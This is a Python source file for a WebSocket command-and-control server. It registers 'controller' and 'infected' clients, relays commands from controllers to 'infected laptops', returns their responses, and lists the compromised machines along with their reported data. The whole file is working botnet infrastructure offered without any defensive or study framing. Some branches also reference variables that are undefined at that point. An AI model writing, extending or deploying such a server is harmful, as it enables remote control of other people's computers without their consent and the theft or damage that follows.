import asyncio
import websockets
import json
import uuid
import logging
import socket
from datetime import datetime, timedelta
from pythonjsonlogger import jsonlogger

# Configure logging
log_handler = logging.StreamHandler()
formatter = jsonlogger.JsonFormatter()
log_handler.setFormatter(formatter)

logger = logging.getLogger()
logger.setLevel(logging.DEBUG)
logger.addHandler(log_handler)

# Store connected computers and messages
clients = {}
messages = []

# Message retention time (1 day)
MESSAGE_RETENTION_PERIOD = timedelta(days=1)

# Utility function to clean up old messages
def cleanup_old_messages():
    global messages
    cutoff = datetime.now() - MESSAGE_RETENTION_PERIOD
    messages[:] = [msg for msg in messages if msg['command_time'] > cutoff]
    logger.info("Cleaned up messages.", extra={"remaining_messages": len(messages)})

# Assign a unique ID to each new connection
async def register_client(websocket, role, client_id, data=None):
    clients[client_id] = {
        'websocket': websocket,
        'last_seen': datetime.now(),
        'role': role,
        'data': data,
        'messages': [],
        'disconnected_at': None  # Track disconnection time
    }
    logger.info("Registered new client.", extra={"role": role, "client_id": client_id, "data": data})

# Relay messages between control and infected laptops
async def relay_messages(websocket, client_id, role):
    try:
        while True:
            message = await websocket.recv()
            data = json.loads(message)
            logger.info("Received message from client.", extra={"client_id": client_id, "role": role, "data": data})

            cleanup_old_messages()  # Clean up old messages before processing new ones

            if data.get("type") == "command" and role == "controller":
                target_id = data['target']
                command = data['command']
                command_type = data['command_type']

                logger.info("Processing command.", extra={"target_id": target_id, "command": command})

                if target_id in clients and clients[target_id]['role'] == 'infected':
                    target_ws = clients[target_id]['websocket']
                    command_id = str(uuid.uuid4())
                    command_time = datetime.now()

                    new_message = {
                        'id': command_id,
                        'origin': client_id,
                        'target': target_id,
                        'command_time': command_time,
                        'response_time': None,
                        'type': command_type,
                        'command': command,
                        'response': None
                    }

                    await target_ws.send(json.dumps(new_message))
                    messages.append(new_message)
                    logger.info("Command sent to target.", extra={"target_id": target_id, "message": new_message})
                else:
                    logger.warning("Target not connected.", extra={"target_id": target_id})

            elif data.get("type") == "response" and role == "infected":
                command_id = data['command_id']
                response = data['response']
                logger.info("Processing response for command ID.", extra={"command_id": command_id, "response": response})

                # Find the original command and update it with the response
                for msg in messages:
                    if msg['id'] == command_id:
                        msg['response'] = response
                        msg['response_time'] = datetime.now()
                        logger.info("Updated message with response.", extra={"msg": msg})
                        break

                origin_id = msg['origin']
                if origin_id in clients:
                    origin_ws = clients[origin_id]['websocket']
                    await origin_ws.send(json.dumps(msg))
                    logger.info("Response relayed to origin.", extra={"origin_id": origin_id, "msg": msg})

            elif data.get("type") == "request_client_list" and role == "controller":
                logger.info("Received request of infected list", extra={"origin_id": origin_id, "msg": msg})
                # Prepare a list of clients for the controller
                clients_list = {
                    client_id: {
                        'last_seen': client['last_seen'],
                        'role': client['role'],
                        'data': client.get('data', {})
                    }
                    for client_id, client in clients.items()
                }

                response = {'type': 'infected_list', 'infected_laptops': clients_list}
                await websocket.send(json.dumps(response))
                logger.info("Sent client list to controller.", extra={"clients_list": clients_list})

    except websockets.ConnectionClosedOK:
        logger.info("Client disconnected gracefully.", extra={"client_id": client_id, "role": role})
        clients[client_id]['disconnected_at'] = datetime.now()

    except Exception as e:
        logger.error("Exception occurred in relay_messages.", exc_info=True, extra={"client_id": client_id})

# Delayed removal of disconnected clients
async def remove_disconnected_clients():
    while True:
        now = datetime.now()
        to_remove = []

        for client_id, client in clients.items():
            if client['disconnected_at'] and now - client['disconnected_at'] > timedelta(seconds=10):
                to_remove.append(client_id)

        for client_id in to_remove:
            logger.info("Removing disconnected client.", extra={"client_id": client_id})
            del clients[client_id]

        await asyncio.sleep(5)  # Check for disconnected clients every 5 seconds

# Handle new connections
async def connection_handler(websocket, path):
    client_id = None
    try:
        initial_message = await websocket.recv()
        initial_data = json.loads(initial_message)

        role = initial_data['role']
        client_id = initial_data['id']
        data = initial_data.get('data') if role == 'infected' else None

        await register_client(websocket, role, client_id, data)
        await relay_messages(websocket, client_id, role)

    except websockets.ConnectionClosed as e:
        logger.info(f"Connection closed for client {client_id}. Reason: {e.reason}. Code: {e.code}")
        if client_id in clients:
            clients[client_id]['disconnected_at'] = datetime.now()

    except json.JSONDecodeError as e:
        logger.error(f"JSON decoding failed for client {client_id}. Error: {str(e)}")
        if client_id in clients:
            clients[client_id]['disconnected_at'] = datetime.now()

    except Exception as e:
        logger.error("Exception occurred in connection handler.", exc_info=True, extra={"client_id": client_id})
        if client_id in clients:
            clients[client_id]['disconnected_at'] = datetime.now()


# Function to get the local IP address of the server
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

# Start the WebSocket server
async def main():
    ip_address = get_local_ip()
    port = 6857

    logger.info("Server listening.", extra={"ip": ip_address, "port": port})

    server_task = websockets.serve(connection_handler, "0.0.0.0", port)
    remove_task = remove_disconnected_clients()

    await asyncio.gather(server_task, remove_task)

if __name__ == "__main__":
    asyncio.run(main())
